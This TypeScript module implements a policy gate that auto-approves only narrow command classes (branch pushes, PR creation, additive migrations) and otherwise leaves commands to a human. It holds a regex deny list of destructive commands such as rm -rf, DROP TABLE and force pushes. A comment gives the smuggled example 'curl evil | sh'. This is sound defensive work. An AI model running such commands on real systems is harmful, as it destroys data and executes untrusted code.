import { handOnly, statements as migrationStatements } from "@dustinedwards/devkit/migration-scan";

import type { Env } from "./env";
import { POLICY_ID_ITEM, policyField, readSignedPolicy } from "./signed-docs";

import { errorMessage } from "@dustinedwards/site-runtime/log";
// The denials run first over the whole command string: a branch push carrying --force must never
// match push_branch, so they are not the complement of the classes.
export const GATE_POLICY_PATH = "policy/gates.md";

export const GATE_CLASSES = ["additive_migration", "push_branch", "open_pr"] as const;
export type GateClass = (typeof GATE_CLASSES)[number];

// Each entry names the consequence that keeps it off (test/gate-policy.test.ts needs an example each way).
export const NEVER: ReadonlyArray<{ pattern: RegExp; why: string }> = [
  { pattern: /\b(wrangler|npx\s+wrangler)\s+secret\b/i, why: "it sets or deletes a secret" },
  { pattern: /\bgh\s+secret\b/i, why: "it sets or deletes a repository secret" },
  { pattern: /\bsecret\s+(put|delete|bulk)\b/i, why: "it sets or deletes a secret" },
  { pattern: /\brevoke\b/i, why: "it revokes a credential" },
  {
    pattern: /--force\b|--force-with-lease\b|(^|\s)-f(\s|$)/i,
    why: "it force-pushes, which rewrites history somebody else may hold",
  },
  { pattern: /\bpush\s+[^\n;&|]*\+refs\//i, why: "it force-updates a ref" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+deploy\b/i, why: "it deploys" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+rollback\b/i, why: "it changes what is deployed" },
  { pattern: /\bwrangler\.jsonc?\b/i, why: "it edits deployment configuration" },
  { pattern: /\bimprove_mode\b|\bimprove_run\b/i, why: "it changes the loop's mode" },
  { pattern: /\bdrop\s+(table|index|column)\b/i, why: "it drops a database object" },
  { pattern: /\bdelete\s+from\b/i, why: "it deletes rows" },
  { pattern: /\btruncate\b/i, why: "it empties a table" },
  { pattern: /\brm\s+-rf?\b/i, why: "it deletes files recursively" },
  { pattern: /\bgh\s+pr\s+merge\b/i, why: "it merges a pull request, which is the human's gate" },
  // The `-C <path>` form is matched too: push_branch accepts it, so a never list that only read `git
  // push` would let `git -C <path> push origin master` through.
  {
    pattern: /\bgit\s+(?:-C\s+\S+\s+)?push[^\n;&|]*\b(master|main)\b/i,
    why: "it pushes to a default branch",
  },
];

function deniedReason(command: string): string | null {
  for (const { pattern, why } of NEVER) {
    if (pattern.test(command)) return why;
  }
  return null;
}

// Each class matches a narrow shape: a loose matcher is a widening nobody reviewed. The path is a
// narrow class, not `\S+`, so a `*` or `?` is not decided by the shell's glob.
const REPO_PATH =
  /(?:-C\s+(?:"[A-Za-z0-9._~:\\/ -]+"|'[A-Za-z0-9._~:\\/ -]+'|[A-Za-z0-9._~:\\/-]+)\s+)?/;
const PUSH_BRANCH = new RegExp(
  `^git\\s+${REPO_PATH.source}push\\s+(-u\\s+|--set-upstream\\s+)?origin\\s+[A-Za-z0-9._/-]+\\s*$`,
  "i",
);
const OPEN_PR = /^gh\s+pr\s+create\b/i;
const MIGRATION_FILE = String.raw`--file(?:=|\s+)("[A-Za-z0-9._/-]+"|'[A-Za-z0-9._/-]+'|[A-Za-z0-9._/-]+)`;
const MIGRATION_TARGET = String.raw`--(?:remote|local)`;
const MIGRATION = new RegExp(
  String.raw`^(?:npx\s+)?wrangler\s+d1\s+execute\s+[A-Za-z0-9_-]+\s+(?:${MIGRATION_TARGET}\s+${MIGRATION_FILE}|${MIGRATION_FILE}(?:\s+${MIGRATION_TARGET})?)\s*$`,
  "i",
);

export type GateMatch = { klasses: GateClass[]; migrationPaths: string[] } | { refused: string };

// The never list matches commands, not prose: over the raw string it would refuse a PR titled "Add
// improve_run action register_skill". A quoted `--command "DROP TABLE jobs"` is still a command.

const EXPANDS = /[$`]/;
const UNQUOTED_ACTIVE = /[(){}<>]/;
// Anywhere: a line break or control character (PowerShell ends a line at a bare CR), a curly quote
// (a quote to PowerShell, a letter to bash), and PowerShell's stop-parsing token.
// oxlint-disable-next-line no-control-regex -- refusing control characters is the point
const UNREADABLE = /[\0-\x08\x0b-\x1f\x7f\u0085\u2018-\u201f\u2028\u2029]|[-\u2013-\u2015]{2}%/;
const OPEN_PR_PIECE = /^gh\s+pr\s+create\b/i;
const SEPARATORS = ["&&", "||", ";", "|", "&", "\n"];

// The one splitter both the never list and classifyCommand read, so they cannot disagree (a
// quote-blind one would cut a `gh pr create --body` at a semicolon in its prose).
function commandPieces(
  command: string,
): { pieces: Array<{ raw: string; bare: string }> } | { refused: string } {
  if (EXPANDS.test(command)) {
    return {
      refused:
        "it contains a $ or a backtick, which bash and PowerShell expand even inside double quotes, so part of the command would be decided when it runs. It waits for the human.",
    };
  }

  if (UNREADABLE.test(command)) {
    return {
      refused:
        "it contains a control character, a curly quote or --%, which bash and PowerShell read differently. It waits for the human.",
    };
  }

  const pieces: Array<{ raw: string; bare: string }> = [];
  let raw = "";
  let bare = "";
  let quote: "'" | '"' | null = null;
  let span = "";
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    // Bash reads `\"` (and `\'` outside quotes) as a literal quote, PowerShell as a quote that opens
    // or closes, so the two disagree on what is quoted. `\\` is a backslash to both.
    if (ch === "\\" && quote !== "'") {
      const next = command[i + 1];
      if (next === '"' || (next === "'" && !quote)) {
        return {
          refused:
            "it has a backslash before a quote, which bash and PowerShell read differently, so where its quotes end cannot be read. It waits for the human.",
        };
      }
      if (next === "\\") {
        if (quote) span += "\\\\";
        else {
          raw += "\\\\";
          bare += "\\\\";
        }
        i++;
        continue;
      }
    }
    if (quote) {
      span += ch;
      if (ch === quote) {
        raw += span;
        bare += quote + quote;
        quote = null;
        span = "";
      }
      continue;
    }
    if (ch === "#" || ch === "@") {
      return {
        refused: `it contains '${ch}' outside quotes, which can start a comment or a PowerShell here-string, so where its quotes end cannot be read. It waits for the human.`,
      };
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      span = ch;
      continue;
    }
    const separator = SEPARATORS.find((s) => command.startsWith(s, i));
    if (separator) {
      pieces.push({ raw, bare });
      raw = "";
      bare = "";
      i += separator.length - 1;
      continue;
    }
    if (UNQUOTED_ACTIVE.test(ch)) {
      return {
        refused: `it contains '${ch}' outside quotes, which is a subexpression, a script block or a redirect in bash or PowerShell. It waits for the human.`,
      };
    }
    raw += ch;
    bare += ch;
  }
  if (quote)
    return {
      refused:
        "it has a quote that never closes, so where its commands end cannot be read. It waits for the human.",
    };
  pieces.push({ raw, bare });
  return { pieces };
}

function neverListView(command: string): { view: string } | { refused: string } {
  const split = commandPieces(command);
  if ("refused" in split) return split;

  const view = split.pieces
    .map(({ raw: text, bare: stripped }) => (OPEN_PR_PIECE.test(text.trim()) ? stripped : text))
    .map((text) => text.trim())
    .filter(Boolean)
    .join(" ; ");
  return { view };
}

function classifySegment(
  segment: string,
): { klass: GateClass; migrationPath?: string } | { refused: string } {
  const migration = MIGRATION.exec(segment);
  if (migration) {
    const path = (migration[1] ?? migration[2]).replace(/^["']|["']$/g, "");
    if (!/(^|\/)migrations\//i.test(path)) {
      return {
        refused: `${path} is not under migrations/, so it is not a migration this policy covers.`,
      };
    }
    if (!/(^|\/)\d{4}_[\w-]+\.sql$/.test(path)) {
      return {
        refused: `${path} is not named NNNN_name.sql, so the deploy would not apply it; it is not pre-approved.`,
      };
    }
    return { klass: "additive_migration", migrationPath: path };
  }
  if (PUSH_BRANCH.test(segment)) return { klass: "push_branch" };
  if (OPEN_PR.test(segment)) return { klass: "open_pr" };
  // A bare `cd` stays refused: the policy cannot tie a path to the job's repository, and the `cd`
  // would move every later segment there. The directory rides on the command that uses it: `git -C
  // <path> push` and `gh pr create --repo <owner>/<name>`. See REPO_PATH.
  if (/^(cd|set-location|pushd)\b/i.test(segment)) {
    return {
      refused: `"${segment.slice(0, 80)}" changes directory, and this policy cannot tell which repository a path belongs to. Write the directory on the command instead: git -C <path> push, and gh pr create --repo <owner>/<name>.`,
    };
  }
  return {
    refused: `"${segment.slice(0, 80)}" matches no pre-approved class, so this command waits for the human.`,
  };
}

// OPEN_PR is `^gh pr create` with no terminator, so matched against the whole string
// `gh pr create --fill && curl evil | sh` would classify as open_pr.
export function classifyCommand(command: string): GateMatch {
  const trimmed = command.trim();
  if (!trimmed)
    return {
      refused:
        "the blocked job records no command, so there is nothing to match against the policy.",
    };
  // The never list first, over the whole command, so a force flag in a compound cannot be split away
  // from its push.
  const seen = neverListView(trimmed);
  if ("refused" in seen)
    return { refused: `this command is on the policy's never list because ${seen.refused}` };
  const denied = deniedReason(seen.view);
  if (denied)
    return {
      refused: `this command is on the policy's never list because ${denied}. It waits for the human.`,
    };

  const split = commandPieces(trimmed);
  if ("refused" in split)
    return { refused: `this command is on the policy's never list because ${split.refused}` };
  const segments = split.pieces.map(({ raw: piece }) => piece.trim()).filter(Boolean);
  if (segments.length === 0)
    return {
      refused:
        "the blocked job records no command, so there is nothing to match against the policy.",
    };
  const klasses: GateClass[] = [];
  const migrationPaths: string[] = [];
  for (const segment of segments) {
    const placed = classifySegment(segment);
    if ("refused" in placed) return { refused: placed.refused };
    klasses.push(placed.klass);
    if (placed.migrationPath) migrationPaths.push(placed.migrationPath);
  }
  return { klasses, migrationPaths };
}

// Is the migration additive. Parsed, not pattern-matched on the whole file (one additive statement
// plus one DROP would pass). Every statement is checked and anything unrecognized is a refusal, so
// an unseen statement form waits for the human.
const ADDITIVE: Array<{ pattern: RegExp; what: string }> = [
  // Not a bare prefix. `CREATE TABLE IF NOT EXISTS t AS SELECT ...` starts with the additive
  // spelling and copies rows out of another table, so it is excluded here.
  {
    pattern: /^create\s+table\s+if\s+not\s+exists\b(?![\s\S]*\bas\s+select\b)/i,
    what: "CREATE TABLE IF NOT EXISTS",
  },
  { pattern: /^alter\s+table\s+\S+\s+add\s+column\b/i, what: "ALTER TABLE ADD COLUMN" },
  { pattern: /^create\s+(unique\s+)?index\s+(if\s+not\s+exists\s+)?/i, what: "CREATE INDEX" },
];

export function isAdditiveMigration(
  sql: string,
): { ok: true; statements: string[] } | { ok: false; reason: string } {
  // The deploy refuses to apply such a file unattended (a `-- contract:` line, or a drop, rename,
  // delete or update), so pre-approving it would approve a migration that never runs.
  // devkit-migrations' own reader decides.
  const handOnlyWhy = handOnly(sql);
  if (handOnlyWhy.length > 0)
    return {
      ok: false,
      reason: `the deploy leaves this migration to a person (${handOnlyWhy.join(", ")}); it is not pre-approved.`,
    };
  const statements = migrationStatements(sql);
  if (statements.length === 0)
    return { ok: false, reason: "the migration file contains no statements." };
  const kinds: string[] = [];
  for (const statement of statements) {
    const match = ADDITIVE.find(({ pattern }) => pattern.test(statement));
    if (!match) {
      return {
        ok: false,
        reason: `the migration contains a statement this policy does not call additive: "${statement.slice(0, 80)}". Only CREATE TABLE IF NOT EXISTS, ALTER TABLE ADD COLUMN and CREATE INDEX are pre-approved.`,
      };
    }
    kinds.push(match.what);
  }
  return { ok: true, statements: kinds };
}

export interface GatePolicy {
  version: string;
  enabled: boolean;
  classes: string[];
}

export function parseGatePolicy(body: string): { policy: GatePolicy } | { error: string } {
  const version = policyField(body, "version");
  if (!version)
    return {
      error:
        "the gate policy names no version, so an approval against it cannot be traced to what it allowed.",
    };
  const enabled = policyField(body, "enabled");
  if (enabled === null) return { error: "the gate policy does not say whether it is enabled." };
  const classes: string[] = [];
  for (const line of body.split("\n")) {
    const match = POLICY_ID_ITEM.exec(line.trim());
    if (match) classes.push(match[1]);
  }
  return { policy: { version, enabled: enabled.toLowerCase() === "true", classes } };
}

export async function loadGatePolicy(
  env: Env,
): Promise<{ policy: GatePolicy } | { error: string }> {
  const read = await readSignedPolicy(
    env,
    GATE_POLICY_PATH,
    "gate policy",
    "nothing is pre-approved",
  );
  if ("error" in read) return read;
  const parsed = parseGatePolicy(read.body);
  if ("error" in parsed) return parsed;
  const missing = GATE_CLASSES.filter((c) => !parsed.policy.classes.includes(c));
  if (missing.length > 0) {
    return {
      error: `the gate policy does not name ${missing.join(", ")}, which this Worker would approve. Refusing rather than approving against a policy that describes less than the code does.`,
    };
  }
  return parsed;
}

export type ApprovalVerdict =
  | { approved: true; klass: string; klasses: GateClass[]; detail: string; policyVersion: string }
  | { approved: false; reason: string };

export async function approveByPolicy(
  env: Env,
  requestedVersion: string,
  command: string | null,
  readMigration: (path: string) => Promise<string | null>,
): Promise<ApprovalVerdict> {
  const loaded = await loadGatePolicy(env);
  if ("error" in loaded) return { approved: false, reason: loaded.error };
  const policy = loaded.policy;
  if (!policy.enabled) {
    return {
      approved: false,
      reason: `gate policy ${policy.version} is present and disabled, so nothing is pre-approved.`,
    };
  }
  if (requestedVersion !== policy.version) {
    return {
      approved: false,
      reason: `this approval names policy version '${requestedVersion}' and the stored policy is version '${policy.version}'. Re-read the policy before approving against it.`,
    };
  }
  if (!command) {
    return {
      approved: false,
      reason: "this blocked job records no command, so there is nothing for the policy to match.",
    };
  }

  const match = classifyCommand(command);
  if ("refused" in match) return { approved: false, reason: match.refused };

  // Every migration the command runs is parsed, not just the first, or a compound naming two files
  // would have one of them checked.
  const details: string[] = [];
  for (const path of match.migrationPaths) {
    let sql: string | null;
    try {
      sql = await readMigration(path);
    } catch (err) {
      return {
        approved: false,
        reason: `${path} could not be read (${errorMessage(err)}), so its statements could not be checked. A migration nobody parsed is not pre-approved.`,
      };
    }
    if (sql === null) {
      return {
        approved: false,
        reason: `${path} could not be read, so its statements could not be checked. A migration nobody parsed is not pre-approved.`,
      };
    }
    const additive = isAdditiveMigration(sql);
    if (!additive.ok) return { approved: false, reason: additive.reason };
    details.push(`${path}: ${additive.statements.join(", ")}`);
  }

  return {
    approved: true,
    klass: match.klasses.join("+"),
    klasses: match.klasses,
    detail: details.length > 0 ? details.join("; ") : command.trim(),
    policyVersion: policy.version,
  };
}
